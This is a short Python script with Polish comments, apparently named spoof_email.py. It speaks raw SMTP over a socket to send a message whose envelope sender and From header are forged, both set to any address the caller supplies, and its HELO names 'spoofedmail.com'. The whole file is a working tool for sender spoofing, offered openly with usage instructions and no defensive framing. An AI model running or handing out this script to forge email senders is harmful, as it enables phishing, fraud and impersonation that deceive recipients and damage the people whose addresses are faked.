import sys
import socket

def send_email(spoofed_from, to_address, subject, message, smtp_server, smtp_port):
    try:
        # Połączenie z serwerem SMTP
        print(f"[INFO] Łączenie z serwerem SMTP {smtp_server}:{smtp_port}...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((smtp_server, smtp_port))
        
        # Odbieranie powitania serwera SMTP
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Wysłanie komendy HELO
        server.send(b"HELO spoofedmail.com\r\n")
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Ustawianie nadawcy (MAIL FROM)
        mail_from_command = f"MAIL FROM: <{spoofed_from}>\r\n".encode()
        server.send(mail_from_command)
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Ustawianie odbiorcy (RCPT TO)
        rcpt_to_command = f"RCPT TO: <{to_address}>\r\n".encode()
        server.send(rcpt_to_command)
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Rozpoczęcie przesyłania treści wiadomości (DATA)
        server.send(b"DATA\r\n")
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Wysyłanie treści wiadomości z nagłówkami
        email_content = (
            f"From: {spoofed_from}\r\n"
            f"To: {to_address}\r\n"
            f"Subject: {subject}\r\n"
            "\r\n"
            f"{message}\r\n"
            ".\r\n"
        ).encode()
        server.send(email_content)
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        
        # Zakończenie połączenia
        server.send(b"QUIT\r\n")
        response = server.recv(1024).decode()
        print(f"[SMTP] {response}")
        server.close()
        print("[INFO] E-mail wysłany pomyślnie!")
    
    except Exception as e:
        print(f"[ERROR] Wystąpił błąd: {e}")

if __name__ == "__main__":
    # Sprawdzanie argumentów wiersza poleceń
    if len(sys.argv) != 7:
        print("Użycie: python3 spoof_email.py <from_address> <to_address> <subject> <message> <smtp_server> <smtp_port>")
        sys.exit(1)
    
    spoofed_from = sys.argv[1]
    to_address = sys.argv[2]
    subject = sys.argv[3]
    message = sys.argv[4]
    smtp_server = sys.argv[5]
    smtp_port = int(sys.argv[6])
    
    send_email(spoofed_from, to_address, subject, message, smtp_server, smtp_port)
